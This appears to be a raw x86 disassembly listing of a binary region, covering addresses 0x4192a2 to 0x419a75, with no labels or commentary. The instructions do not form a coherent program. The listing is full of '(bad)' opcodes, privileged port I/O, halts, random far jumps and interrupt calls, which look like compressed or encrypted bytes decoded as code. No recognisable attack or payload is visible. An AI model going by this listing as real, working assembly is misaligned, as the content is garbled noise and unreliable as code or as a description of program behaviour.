  4192a2:	add    ebp,DWORD PTR [eax]
  4192a4:	mul    edx
  4192a6:	push   es
  4192a7:	dec    esp
  4192a8:	adc    cl,BYTE PTR [esi+edi*2-0x3b]
  4192ac:	xchg   edi,eax
  4192ad:	xchg   DWORD PTR [esi+edx*8],ecx
  4192b0:	pop    ecx
  4192b1:	xor    eax,0x12fc9653
  4192b6:	fcomip st,st(0)
  4192b8:	inc    edi
  4192b9:	mov    ah,0x38
  4192bb:	xchg   edi,eax
  4192bc:	icebp  
  4192bd:	dec    esi
  4192be:	jns    0x419253
  4192c0:	test   BYTE PTR [esi+0x6c],bh
  4192c3:	and    al,0xb8
  4192c5:	sbb    al,0x54
  4192c7:	int3   
  4192c8:	sub    al,0x86
  4192ca:	arpl   bx,bp
  4192cc:	push   edx
  4192cd:	not    bh
  4192cf:	mov    esp,0xee8832cd
  4192d4:	mov    cl,0xfc
  4192d6:	xchg   ebx,eax
  4192d7:	jecxz  0x4192f5
  4192d9:	mov    es,WORD PTR [ebx+0x682d237b]
  4192df:	(bad)  
  4192e0:	sub    DWORD PTR [esi],esp
  4192e2:	cmp    DWORD PTR [edi-0x2b],edi
  4192e5:	js     0x419340
  4192e7:	add    ch,BYTE PTR [edi-0x49]
  4192ea:	xor    DWORD PTR [edx+0x7b],edx
  4192ed:	daa    
  4192ee:	mov    eax,0x2be0b376
  4192f3:	test   BYTE PTR [ebx-0xf],0x29
  4192f7:	or     eax,0x579c7b1d
  4192fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192fd:	sbb    BYTE PTR [edi+0x26],cl
  419300:	jle    0x4192c2
  419302:	cmp    esi,DWORD PTR [ebx+0x2e]
  419305:	mov    ch,0xdd
  419307:	int    0x25
  419309:	xor    BYTE PTR [esp+eiz*4],bl
  41930c:	add    DWORD PTR [ebp+0x258eecd],ebx
  419312:	cs test eax,0x4258f0fe
  419318:	add    edx,DWORD PTR [eax]
  41931a:	outs   dx,BYTE PTR ds:[esi]
  41931b:	clc    
  41931c:	or     dh,0x4d
  41931f:	out    dx,al
  419320:	push   0x4b
  419322:	mov    bh,BYTE PTR [ebx-0x3e5b1549]
  419328:	sti    
  419329:	loope  0x4192d3
  41932b:	ds add esi,eax
  41932e:	jge    0x4192dd
  419330:	pop    edi
  419331:	rol    DWORD PTR [ebp+ecx*2+0xea004cc],0xb8
  419339:	lock dec esi
  41933b:	mov    ds:0xfe3265f0,eax
  419340:	sbb    eax,0x77755d0c
  419345:	(bad)  
  419346:	rcl    ebp,1
  419348:	aam    0x6b
  41934a:	mov    DWORD PTR [ebx],edi
  41934c:	lea    esp,[ebx-0x44]
  41934f:	std    
  419350:	leave  
  419351:	jne    0x4192f0
  419353:	jecxz  0x41936e
  419355:	loop   0x419397
  419357:	mov    cl,0xb5
  419359:	pop    edx
  41935a:	or     cl,dl
  41935c:	dec    edi
  41935d:	in     eax,0x3a
  41935f:	adc    cl,BYTE PTR ds:0x84d452d4
  419365:	cdq    
  419366:	dec    esi
  419367:	psubb  mm6,QWORD PTR [edx+0x7d]
  41936b:	push   ds
  41936c:	push   cs
  41936d:	cmp    BYTE PTR [edx+ebx*8-0x7656fc9a],bh
  419374:	out    dx,eax
  419375:	mov    gs,ebp
  419377:	xor    DWORD PTR [edi+0x7],eax
  41937a:	cmp    ch,bh
  41937c:	mov    BYTE PTR [ecx+ebp*8-0x4e57f19f],0xf5
  419384:	shr    BYTE PTR [edi-0x22],1
  419387:	inc    esp
  419388:	jge    0x41930a
  41938a:	and    BYTE PTR [ebx+esi*1-0x5984c2a6],dl
  419391:	xchg   esi,eax
  419392:	stc    
  419393:	imul   ecx,DWORD PTR [eax],0xffffffcd
  419396:	(bad)  
  419398:	inc    esi
  419399:	xor    eax,0x71f9d15a
  41939e:	cmp    BYTE PTR [eax],dl
  4193a0:	mov    edi,0xacc1ee43
  4193a5:	mov    edi,0x636769b1
  4193aa:	inc    esi
  4193ab:	or     eax,0x4127adc2
  4193b0:	mov    eax,0x810c342d
  4193b5:	gs mov cl,0xd8
  4193b8:	nop
  4193b9:	sub    DWORD PTR [esi],esi
  4193bb:	cmp    DWORD PTR [eax+0x12],ebp
  4193be:	into   
  4193bf:	or     al,0x1b
  4193c1:	pop    esp
  4193c2:	cmp    DWORD PTR ds:0xd671917f,edi
  4193c8:	inc    esi
  4193c9:	fsubr  QWORD PTR [edi+0x7f599b8f]
  4193cf:	and    al,0xc1
  4193d1:	test   DWORD PTR [ebx+0x588343c3],0xfe9b91b7
  4193db:	fcomip st,st(0)
  4193dd:	jno    0x419428
  4193df:	push   ecx
  4193e0:	lds    edi,FWORD PTR [esi+0x1]
  4193e3:	sub    ecx,DWORD PTR ds:0xab09febd
  4193e9:	sbb    dh,BYTE PTR [ecx]
  4193eb:	inc    BYTE PTR [edx]
  4193ed:	in     al,0xcf
  4193ef:	xor    eax,0xa617468
  4193f4:	cmc    
  4193f5:	(bad)  
  4193f7:	xor    DWORD PTR [edi],0x4caa4fa6
  4193fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193fe:	dec    eax
  4193ff:	jecxz  0x419420
  419401:	mov    bl,BYTE PTR [ebx-0x35f0ad45]
  419407:	scas   eax,DWORD PTR es:[edi]
  419408:	out    dx,al
  419409:	cdq    
  41940a:	ss mov dl,0xd3
  41940d:	jmp    0x4193c5
  41940f:	int    0x1b
  419411:	cdq    
  419412:	pop    ebp
  419413:	push   ds
  419414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419415:	mov    bl,0x12
  419417:	dec    edi
  419418:	mov    esi,0x3d426dd8
  41941d:	xor    eax,0xb9595887
  419422:	fs mov dl,0x4e
  419425:	hlt    
  419426:	fmul   st,st(3)
  419428:	gs and eax,0x10766583
  41942e:	jmp    DWORD PTR fs:[bp+si-0x3c]
  419433:	das    
  419434:	fisttp DWORD PTR [ecx-0x50273fbd]
  41943a:	lods   eax,DWORD PTR ds:[esi]
  41943b:	outs   dx,BYTE PTR ds:[esi]
  41943c:	fcmovne st,st(4)
  41943e:	xor    al,0xff
  419440:	push   cs
  419441:	sti    
  419442:	stos   DWORD PTR es:[edi],eax
  419443:	cmp    DWORD PTR [ecx-0x1b],ebp
  419446:	and    ch,BYTE PTR [edx]
  419448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419449:	mov    ah,0xa3
  41944b:	and    al,BYTE PTR [edi+0x79589129]
  419451:	mov    al,0xf1
  419453:	bound  eax,QWORD PTR [ebx-0x2eb299b]
  419459:	shl    DWORD PTR [ebp-0x66c30a98],1
  41945f:	das    
  419460:	les    eax,FWORD PTR [ebx+ebp*2-0x4245385a]
  419467:	(bad)  
  419468:	or     BYTE PTR [esi-0x6f],0x91
  41946c:	aad    0xcf
  41946e:	das    
  41946f:	dec    ecx
  419470:	es mov esp,0xb4a2e44d
  419476:	push   eax
  419477:	jge    0x4194b0
  419479:	into   
  41947a:	mov    ch,0x3c
  41947c:	mov    al,0x8b
  41947e:	add    DWORD PTR [edi],ebp
  419480:	data16 int 0x6b
  419483:	cmp    BYTE PTR [edx-0x4ae9a495],ah
  419489:	jbe    0x41945c
  41948b:	dec    esp
  41948c:	mov    ah,0x99
  41948e:	lock mov BYTE PTR [ebp+0x2c373516],ch
  419495:	or     eax,0x9fbdd75a
  41949a:	pop    es
  41949b:	vdivsd xmm5,xmm4,QWORD PTR [eax]
  41949f:	and    edi,DWORD PTR [esi]
  4194a1:	dec    edi
  4194a2:	mov    al,0x87
  4194a4:	sbb    al,0x3b
  4194a6:	mov    bl,0xd6
  4194a8:	in     eax,dx
  4194a9:	push   ebp
  4194aa:	fidivr DWORD PTR [edx]
  4194ac:	jae    0x419515
  4194ae:	push   edi
  4194af:	ret    0x5271
  4194b2:	or     dh,bh
  4194b4:	jmp    0xf187:0x769cab7e
  4194bb:	mov    bl,dl
  4194bd:	fwait
  4194be:	ret    
  4194bf:	mov    ebp,esp
  4194c1:	fldenv [ebp+0x49b6ce4a]
  4194c7:	mov    bh,0x47
  4194c9:	scas   eax,DWORD PTR es:[edi]
  4194ca:	(bad)  
  4194cc:	jnp    0x419459
  4194ce:	pop    ecx
  4194cf:	mov    WORD PTR [eax+0x6a7e2018],fs
  4194d5:	in     eax,0x52
  4194d7:	mov    ds,WORD PTR [ebp+0x7c4c390f]
  4194dd:	and    ch,BYTE PTR [edx-0x4aa628ad]
  4194e3:	loope  0x419495
  4194e5:	mov    ebx,0xc1f328b1
  4194ea:	mov    ecx,0xf4addd77
  4194ef:	xor    ecx,DWORD PTR [edi]
  4194f1:	stos   DWORD PTR es:[edi],eax
  4194f2:	pop    es
  4194f3:	lock sbb al,0x93
  4194f6:	stos   BYTE PTR es:[edi],al
  4194f7:	mov    bl,0xfc
  4194f9:	out    0x47,al
  4194fb:	xor    al,0x83
  4194fd:	xchg   ecx,eax
  4194fe:	xchg   edx,eax
  4194ff:	das    
  419500:	stos   DWORD PTR es:[edi],eax
  419501:	mov    ebx,0x2420570e
  419506:	mov    bh,0x7e
  419508:	pop    ss
  419509:	bound  esp,QWORD PTR [edi+0x16]
  41950c:	mov    ecx,0xb3d02485
  419511:	frstpm(287 only) 
  419513:	shr    DWORD PTR [edi-0x2e90f745],cl
  419519:	dec    ebp
  41951a:	icebp  
  41951b:	dec    esi
  41951c:	fsub   DWORD PTR [edi-0x9]
  41951f:	mov    ?,edi
  419521:	imul   DWORD PTR [eax-0x7a0f856]
  419527:	xchg   ebp,eax
  419528:	push   edx
  419529:	and    al,0xac
  41952b:	das    
  41952c:	enter  0x98a8,0x14
  419530:	imul   ebp,DWORD PTR [ecx-0x9],0x50
  419534:	ss ja  0x4194cc
  419537:	pop    ebx
  419538:	push   0x61
  41953a:	pushf  
  41953b:	stos   BYTE PTR es:[edi],al
  41953c:	cmp    DWORD PTR [ebp-0x2c397794],ecx
  419542:	in     al,0xfe
  419544:	jno    0x4195b2
  419546:	jbe    0x4194d3
  419548:	inc    eax
  419549:	ret    
  41954a:	jns    0x41951d
  41954c:	mov    BYTE PTR [eax-0x21a5554b],ah
  419552:	dec    ebx
  419553:	xchg   esp,eax
  419554:	mov    eax,0x687fde7e
  419559:	jbe    0x419571
  41955b:	gs push esp
  41955d:	std    
  41955e:	pusha  
  41955f:	mov    WORD PTR [ecx-0x7b],cs
  419562:	arpl   WORD PTR [ebx],bp
  419564:	std    
  419565:	inc    eax
  419566:	pop    edx
  419567:	les    ebx,FWORD PTR [ecx+0x632e4705]
  41956d:	in     al,dx
  41956e:	jb     0x41952c
  419570:	(bad)  
  419571:	cli    
  419572:	cmp    eax,DWORD PTR ds:[eax]
  419575:	pop    eax
  419576:	mov    dl,0x17
  419578:	pop    esp
  419579:	loop   0x4195b8
  41957b:	popa   
  41957c:	push   ds
  41957d:	sbb    dh,BYTE PTR [eax+0x56]
  419580:	in     eax,dx
  419581:	out    0x8c,al
  419583:	or     BYTE PTR [edi+0x4130e8bb],ah
  419589:	into   
  41958a:	cld    
  41958b:	push   ebx
  41958c:	cmp    BYTE PTR [ebp+0x38],ch
  41958f:	or     BYTE PTR [edx+0xf6aac5b],bl
  419595:	sub    eax,0x50f031a4
  41959a:	add    BYTE PTR ds:0xa25adf1a,ah
  4195a0:	out    0xfb,eax
  4195a2:	and    BYTE PTR [eax+edx*4],ch
  4195a5:	push   ss
  4195a6:	pop    ebp
  4195a7:	mov    ecx,0xf5668269
  4195ac:	loope  0x41961e
  4195ae:	(bad)  
  4195af:	sbb    esi,DWORD PTR [ebx]
  4195b1:	or     ecx,edx
  4195b3:	fcom   DWORD PTR [esi-0x239ed314]
  4195b9:	out    dx,eax
  4195ba:	xor    bh,BYTE PTR [edx]
  4195bc:	push   edx
  4195bd:	pop    esi
  4195be:	ins    DWORD PTR es:[edi],dx
  4195bf:	xor    eax,0x25b8ecb7
  4195c4:	ror    BYTE PTR [ebx-0x37c48718],0x8a
  4195cb:	add    BYTE PTR [ebx-0x6983e48d],0x50
  4195d2:	out    dx,eax
  4195d3:	jle    0x419642
  4195d5:	outs   dx,BYTE PTR ds:[esi]
  4195d6:	mov    ebp,0x6b82baf2
  4195db:	test   DWORD PTR [ecx+0x45db6931],edx
  4195e1:	pop    ds
  4195e2:	out    0x17,eax
  4195e4:	scas   eax,DWORD PTR es:[edi]
  4195e5:	popa   
  4195e6:	stos   DWORD PTR es:[edi],eax
  4195e7:	xor    eax,0xe7769d67
  4195ec:	or     BYTE PTR [eax],ah
  4195ee:	(bad)  
  4195ef:	xlat   BYTE PTR ds:[ebx]
  4195f0:	mov    cl,BYTE PTR [ebp-0x5e561640]
  4195f6:	nop
  4195f7:	in     al,0x3a
  4195f9:	sbb    BYTE PTR [edi+0x15],0x40
  4195fd:	and    al,BYTE PTR [ebp-0x422054a6]
  419603:	inc    esi
  419604:	retf   0x4ca0
  419607:	ret    0x247e
  41960a:	sbb    al,0x5c
  41960c:	ins    DWORD PTR es:[edi],dx
  41960d:	aam    0xf4
  41960f:	push   ebp
  419610:	xchg   BYTE PTR [edi-0x2],al
  419613:	jmp    0x963d:0x255147fc
  41961a:	std    
  41961b:	adc    eax,0x5f46eefe
  419620:	sub    DWORD PTR [ebx],esi
  419622:	push   ss
  419623:	cmp    eax,0xe0df9982
  419628:	repnz xor al,0x15
  41962b:	or     edi,DWORD PTR [ebx]
  41962d:	push   cs
  41962e:	lock dec edx
  419630:	pop    ss
  419631:	xor    al,0xf8
  419633:	in     eax,0x46
  419635:	mov    bh,0x96
  419637:	(bad)  
  419638:	fimul  DWORD PTR [eax+edi*4-0x34]
  41963c:	sar    bh,0x50
  41963f:	leave  
  419640:	and    eax,0x232e5f21
  419645:	push   ds
  419646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419647:	test   ah,bl
  419649:	(bad)  
  41964a:	in     eax,dx
  41964b:	or     eax,0x15d5ef90
  419650:	and    DWORD PTR [edx+0x2],edi
  419653:	dec    esi
  419654:	jno    0x4196a2
  419656:	jl     0x41969f
  419658:	test   eax,0x154a6fdc
  41965d:	mov    esi,0x14d43de7
  419662:	push   cs
  419663:	pextrw ebx,(bad),0xc5
  419665:	sbb    eax,0x6fde6ad5
  41966a:	add    BYTE PTR [ebx+0x2f],0x92
  41966e:	mov    al,0xdc
  419670:	mov    ebp,0x51a16729
  419675:	push   esi
  419676:	xchg   BYTE PTR [eax+eax*8],bl
  419679:	dec    edx
  41967a:	test   dl,ch
  41967c:	fmul   DWORD PTR [edi-0x51]
  41967f:	leave  
  419680:	mov    ecx,0x5895a6a0
  419685:	mov    ds:0x58efe987,al
  41968a:	push   es
  41968b:	lock cbw 
  41968e:	cdq    
  41968f:	mov    DWORD PTR [ebp-0xf],esp
  419692:	xchg   esp,eax
  419693:	xchg   edx,eax
  419694:	mov    esp,0x675824d3
  419699:	mov    al,0x90
  41969b:	sub    al,0xd5
  41969d:	retf   0xa3a2
  4196a0:	lock jle 0x4196d0
  4196a3:	pushf  
  4196a4:	push   esp
  4196a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196a6:	jg     0x4196bf
  4196a8:	repz (bad) 
  4196ab:	aas    
  4196ac:	int    0x2d
  4196ae:	and    BYTE PTR [ecx+eax*2],ah
  4196b1:	dec    edi
  4196b2:	out    dx,eax
  4196b3:	lahf   
  4196b4:	pop    edi
  4196b5:	mov    eax,ds:0x373fbbc1
  4196ba:	je     0x419712
  4196bc:	or     dh,bh
  4196be:	pop    edx
  4196bf:	xchg   ebp,eax
  4196c0:	xchg   ebx,eax
  4196c1:	cmp    al,BYTE PTR [ecx]
  4196c3:	mov    al,BYTE PTR [edx+0x2f]
  4196c6:	mov    ebp,0x506df480
  4196cb:	enter  0x105f,0x7e
  4196cf:	mov    eax,ds:0xc1e25ef
  4196d4:	out    0xf7,al
  4196d6:	in     al,dx
  4196d7:	retf   
  4196d8:	lods   al,BYTE PTR ds:[esi]
  4196d9:	xor    al,0x85
  4196db:	mov    ebx,0x29eacf0
  4196e0:	mov    ecx,0xc2d695f7
  4196e5:	sbb    BYTE PTR [ecx+0x14eb74d3],dh
  4196eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ec:	mov    esi,0x51a8da08
  4196f1:	cmp    al,0x6c
  4196f3:	popa   
  4196f4:	clc    
  4196f5:	mov    edi,0xf766fc86
  4196fa:	jmp    0xc360:0x717e7949
  419701:	and    esp,DWORD PTR [ebp+0x3]
  419704:	pushf  
  419705:	xor    al,0x75
  419707:	inc    ebp
  419708:	add    dl,bl
  41970a:	std    
  41970b:	push   esp
  41970c:	sbb    esi,ebx
  41970e:	dec    ebx
  41970f:	mov    ecx,0x154c7db3
  419714:	retf   
  419715:	push   esi
  419716:	lahf   
  419717:	pop    edi
  419718:	repnz fsubr st(1),st
  41971b:	inc    edi
  41971c:	addr16 fs mov esp,0x188affa4
  419723:	mov    ah,dl
  419725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419726:	jmp    0xf838:0x249ad775
  41972d:	outs   dx,BYTE PTR ds:[esi]
  41972e:	dec    eax
  41972f:	cmovb  ecx,DWORD PTR [ebp+0x4c]
  419733:	and    al,0x15
  419735:	sbb    cl,BYTE PTR [bx+di-0x6c]
  419739:	dec    eax
  41973a:	ror    BYTE PTR [ebx-0x2a],0xb4
  41973e:	xchg   esp,eax
  41973f:	jg     0x4197a4
  419741:	sub    DWORD PTR [edx-0x7a],esp
  419744:	add    DWORD PTR [ecx+0x29],edi
  419747:	(bad)  
  419748:	and    bl,BYTE PTR [esi-0x4c]
  41974b:	mov    ah,0xa0
  41974d:	ins    DWORD PTR es:[edi],dx
  41974e:	or     bl,bl
  419750:	xchg   esi,eax
  419751:	out    0x78,eax
  419753:	rol    DWORD PTR [eax-0x27],1
  419756:	mov    dh,BYTE PTR [ebp-0x7b]
  419759:	aas    
  41975a:	jnp    0x4196e7
  41975c:	retf   0xb380
  41975f:	sbb    bh,ch
  419761:	add    eax,0x1bc35e6
  419766:	jmp    0x1f99:0x6e46773d
  41976d:	sub    al,0x90
  41976f:	popa   
  419770:	nop
  419771:	pushf  
  419772:	div    DWORD PTR [ecx+0x5f]
  419775:	ret    0x8562
  419778:	push   edi
  419779:	jp     0x419722
  41977b:	jl     0x419730
  41977d:	pushf  
  41977e:	addr16 mov al,0x57
  419781:	call   0x809c:0x21d5dc99
  419788:	push   0xfffffffc
  41978a:	sub    eax,0xf08dd5e2
  41978f:	and    al,0x6f
  419791:	dec    ecx
  419792:	mov    ch,0xb4
  419794:	test   DWORD PTR [edi-0x53],edi
  419797:	shl    DWORD PTR [eax+0x4b],cl
  41979a:	ret    
  41979b:	jg     0x419729
  41979d:	inc    ebp
  41979e:	pop    ecx
  41979f:	xor    BYTE PTR [ecx+0x20],bh
  4197a2:	cs loop 0x419728
  4197a5:	jmp    0xdcdc:0x18b8c9ab
  4197ac:	int    0xd7
  4197ae:	test   BYTE PTR [ebp-0x61aef97f],bh
  4197b4:	lahf   
  4197b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197b6:	push   cs
  4197b7:	dec    esp
  4197b8:	or     DWORD PTR [ebx-0x34c915f7],edx
  4197be:	repz cmp BYTE PTR [ebx],0x77
  4197c2:	repnz add DWORD PTR [ecx+0x8f9e6e7],edx
  4197c9:	out    dx,al
  4197ca:	inc    ebp
  4197cb:	popf   
  4197cc:	fcomp  QWORD PTR [edi]
  4197ce:	dec    ecx
  4197cf:	mov    bl,0xe4
  4197d1:	xchg   ebx,eax
  4197d2:	test   al,0xad
  4197d4:	outs   dx,DWORD PTR ds:[esi]
  4197d5:	pushf  
  4197d6:	mov    ecx,0x5481043
  4197db:	adc    al,0x96
  4197dd:	sbb    ebx,ebp
  4197df:	or     BYTE PTR [esi+edx*2+0x3729e6f7],ah
  4197e6:	loopne 0x41984c
  4197e8:	push   edi
  4197e9:	mov    ebp,0xb22ba23d
  4197ee:	stos   BYTE PTR es:[edi],al
  4197ef:	popa   
  4197f0:	sub    eax,0xf114460b
  4197f5:	push   cs
  4197f6:	pop    ds
  4197f7:	shr    BYTE PTR [ecx+0x95b1967],1
  4197fd:	push   ebp
  4197fe:	pop    es
  4197ff:	popa   
  419800:	push   ebx
  419801:	scas   eax,DWORD PTR es:[edi]
  419802:	mov    ds:0xafb5e5c9,eax
  419807:	icebp  
  419808:	call   0xd6bb:0xe5845bde
  41980f:	fsub   QWORD PTR [eax+0x6e6525e5]
  419815:	fadd   QWORD PTR [esi-0x2b]
  419818:	imul   ebx,DWORD PTR [ebx],0xffffff83
  41981b:	dec    esi
  41981c:	dec    eax
  41981d:	sbb    al,BYTE PTR [ecx+0x56]
  419820:	popa   
  419821:	and    DWORD PTR [esi+0x3],ebx
  419824:	xchg   ecx,eax
  419825:	ret    
  419826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419827:	xchg   edx,eax
  419828:	xchg   ebx,eax
  419829:	inc    ebx
  41982a:	lock fdivr st(1),st
  41982d:	mov    al,0x97
  41982f:	bound  ebp,QWORD PTR [esi+esi*8]
  419832:	pusha  
  419833:	mov    dh,0xb5
  419835:	retf   0xac27
  419838:	and    DWORD PTR [ecx+0x6],ecx
  41983b:	sbb    al,0xbf
  41983d:	out    0x8d,eax
  41983f:	sbb    ch,cl
  419841:	lock jle 0x41988b
  419844:	div    dh
  419846:	push   es
  419847:	inc    esi
  419848:	mov    dl,0xed
  41984a:	(bad)  
  41984b:	push   esp
  41984c:	add    DWORD PTR [edx],esp
  41984e:	sub    eax,0xacc6d7e4
  419853:	or     dl,BYTE PTR [esi-0x20387237]
  419859:	dec    ebx
  41985a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985b:	mov    ebp,0x4f4f6714
  419860:	and    al,0x38
  419862:	je     0x41988f
  419864:	out    0x67,eax
  419866:	push   edi
  419867:	les    esp,FWORD PTR [edx]
  419869:	into   
  41986a:	(bad)  
  41986b:	pushf  
  41986c:	push   ebx
  41986d:	dec    esi
  41986e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419870:	fdiv   DWORD PTR [esi+0x29]
  419873:	sti    
  419874:	dec    ebx
  419875:	mov    ch,0xfb
  419877:	imul   ebp,DWORD PTR [esi-0x2c02eabd],0x2594f667
  419881:	jb     0x419871
  419883:	mov    ss,ebx
  419885:	xchg   ecx,eax
  419886:	pop    edi
  419887:	stos   DWORD PTR es:[edi],eax
  419888:	fidiv  DWORD PTR [esi-0x36967793]
  41988e:	mov    al,ds:0x4914d5d3
  419893:	cmp    al,0xd5
  419895:	jne    0x4198ab
  419897:	xchg   ebx,eax
  419898:	cmc    
  419899:	hlt    
  41989a:	add    ebx,DWORD PTR [eax-0x2c]
  41989d:	pop    edx
  41989e:	mov    ecx,0x934be2fa
  4198a3:	into   
  4198a4:	imul   ecx,DWORD PTR [ebx],0x4c
  4198a7:	and    ecx,DWORD PTR [ebx]
  4198a9:	xor    BYTE PTR [ebx-0xe45bcd7],al
  4198af:	mov    esp,esp
  4198b1:	mov    ds:0xf9b59bea,eax
  4198b6:	mov    edi,0x6c93217a
  4198bb:	das    
  4198bc:	and    eax,0x32b9b798
  4198c1:	mov    eax,DWORD PTR [edi]
  4198c3:	aaa    
  4198c4:	cmp    al,0x63
  4198c6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4198c8:	or     DWORD PTR [ecx+0x58],0x3294a91c
  4198cf:	mov    eax,0x9c5e9151
  4198d4:	es adc al,0x6a
  4198d7:	les    ecx,FWORD PTR [ebx-0x1eb670cf]
  4198dd:	jg     0x41988c
  4198df:	mov    edi,0x22d6a90d
  4198e4:	sub    eax,0x72081bc0
  4198e9:	cmc    
  4198ea:	xchg   edx,eax
  4198eb:	in     al,dx
  4198ec:	hlt    
  4198ed:	rcl    BYTE PTR [edi-0x3b],1
  4198f0:	pusha  
  4198f1:	in     eax,dx
  4198f2:	in     al,0x9d
  4198f4:	lea    edi,[esi]
  4198f6:	cld    
  4198f7:	out    dx,al
  4198f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198f9:	mov    edx,0x913e30f7
  4198fe:	jecxz  0x41996a
  419900:	sbb    dl,bh
  419902:	cwde   
  419903:	out    0x78,al
  419905:	out    dx,al
  419906:	shl    DWORD PTR [ebx],cl
  419908:	in     eax,dx
  419909:	repz stc 
  41990b:	sbb    eax,0xd697d5f6
  419910:	daa    
  419911:	xchg   ecx,eax
  419912:	push   edx
  419913:	and    al,0x22
  419915:	add    al,BYTE PTR [esi+ebp*8-0x6a0787fc]
  41991c:	js     0x4198f6
  41991e:	jle    0x4198fc
  419920:	xor    eax,0xb41b32e0
  419925:	retf   
  419926:	in     eax,0xd7
  419928:	cmc    
  419929:	(bad)  
  41992a:	mov    ch,0x8d
  41992c:	jl     0x419931
  41992e:	jp     0x419940
  419930:	stos   BYTE PTR es:[edi],al
  419931:	xor    ebp,DWORD PTR [eax+0x5745e6e3]
  419937:	(bad)  
  419938:	push   ss
  419939:	pop    ds
  41993a:	push   esp
  41993b:	daa    
  41993c:	shr    BYTE PTR [ecx-0x193881aa],1
  419942:	fcomp  DWORD PTR [esi]
  419944:	cld    
  419945:	and    esi,DWORD PTR [edx-0x5d]
  419948:	pop    esi
  419949:	xchg   esi,eax
  41994a:	ins    BYTE PTR es:[edi],dx
  41994b:	stos   DWORD PTR es:[edi],eax
  41994c:	and    BYTE PTR [ebx+0x634f87ed],0xfc
  419953:	mov    BYTE PTR [ecx],bl
  419955:	mov    ecx,0x4b75d90d
  41995a:	jne    0x4199aa
  41995c:	fld    TBYTE PTR [esi-0x5331be17]
  419962:	fidiv  WORD PTR [edx-0x12d486e3]
  419968:	cmp    DWORD PTR [edi+0x29a08980],0x1e087811
  419972:	sub    DWORD PTR [esi-0x9],ecx
  419975:	or     edx,esp
  419977:	sahf   
  419978:	aam    0x14
  41997a:	or     bl,BYTE PTR [esi]
  41997c:	lods   al,BYTE PTR ds:[esi]
  41997d:	test   eax,0x8d8b4348
  419982:	rcr    BYTE PTR ds:0x93bfe52b,1
  419988:	fimul  WORD PTR [esi]
  41998a:	mov    dh,0x72
  41998c:	mov    ds,WORD PTR [edx-0x7543ee75]
  419992:	outs   dx,BYTE PTR ds:[esi]
  419993:	cmp    BYTE PTR [eax+0x15],0x96
  419997:	test   bl,ch
  419999:	pop    ebx
  41999a:	enter  0xbd5b,0xdf
  41999e:	outs   dx,DWORD PTR ds:[esi]
  41999f:	mov    al,ah
  4199a1:	xor    BYTE PTR [ecx],bl
  4199a3:	push   ebx
  4199a4:	stos   DWORD PTR es:[edi],eax
  4199a5:	das    
  4199a6:	sbb    cl,ch
  4199a8:	push   ebp
  4199a9:	jns    0x4199c8
  4199ab:	jp     0x4199a0
  4199ad:	and    DWORD PTR [eax+0x71de439f],ebx
  4199b3:	imul   ebp,DWORD PTR [ecx-0x522df871],0x26c26311
  4199bd:	fimul  WORD PTR [edi+0x60]
  4199c0:	neg    BYTE PTR [edx+0x1ff2434f]
  4199c6:	sub    DWORD PTR [eax-0x49212179],esi
  4199cc:	add    BYTE PTR [eax],bl
  4199ce:	mov    ecx,eax
  4199d0:	pop    edi
  4199d1:	dec    edx
  4199d2:	sbb    al,0xd8
  4199d4:	shl    DWORD PTR [eax-0xd],0xc6
  4199d8:	iret   
  4199d9:	icebp  
  4199da:	mov    bh,0xcd
  4199dc:	mov    ebp,0x3561b37c
  4199e1:	dec    ebx
  4199e2:	sbb    BYTE PTR [eax+eiz*2+0x55],ah
  4199e6:	mov    ah,0xf0
  4199e8:	mov    dl,0xaa
  4199ea:	js     0x419990
  4199ec:	mov    esi,0x373fc22
  4199f1:	or     eax,0x667b9128
  4199f6:	(bad)  
  4199f9:	pop    esp
  4199fa:	jge    0x419996
  4199fc:	xor    BYTE PTR [esp+eax*8+0x1d0e0bc8],cl
  419a03:	and    al,0xcc
  419a05:	jno    0x419a6f
  419a07:	jno    0x419a5c
  419a09:	neg    BYTE PTR [eax]
  419a0b:	mov    edi,0xf6976cf2
  419a10:	push   cs
  419a11:	aas    
  419a12:	(bad)  
  419a14:	cs daa 
  419a16:	fbstp  TBYTE PTR [edx]
  419a18:	jbe    0x419a90
  419a1a:	inc    edx
  419a1b:	sub    al,ah
  419a1d:	xor    BYTE PTR [edi+0xf7b3d14],ah
  419a23:	jo     0x419a17
  419a25:	or     al,0x8c
  419a27:	pop    ss
  419a28:	mov    BYTE PTR [esi],bl
  419a2a:	test   al,0xa4
  419a2c:	jp     0x4199af
  419a2e:	(bad)  
  419a2f:	and    bh,bl
  419a31:	loopne 0x4199bc
  419a33:	call   0x1eb7:0xc839966
  419a3a:	sub    al,0x6a
  419a3c:	outs   dx,DWORD PTR ds:[esi]
  419a3d:	mov    edi,0x27976657
  419a42:	stc    
  419a43:	lods   eax,DWORD PTR ds:[esi]
  419a44:	pop    edx
  419a45:	mov    ch,0x55
  419a47:	fcomp  DWORD PTR [esi]
  419a49:	pop    ecx
  419a4a:	lea    ecx,[edx+0x33873721]
  419a50:	push   ebp
  419a51:	inc    eax
  419a52:	scas   al,BYTE PTR es:[edi]
  419a53:	and    BYTE PTR [ecx+0x4e0f8d35],dl
  419a59:	mov    al,0x7b
  419a5b:	add    esi,0x51
  419a5e:	fnstsw WORD PTR [ebp-0x21b603fd]
  419a64:	sti    
  419a65:	icebp  
  419a66:	adc    eax,0x7a6784b1
  419a6b:	cmp    ebp,ebp
  419a6d:	stos   DWORD PTR es:[edi],eax
  419a6e:	aam    0xd
  419a70:	mov    bh,0xa4
  419a72:	push   ds
  419a73:	mov    cl,0xc6
  419a75:	cs xchg edi,eax
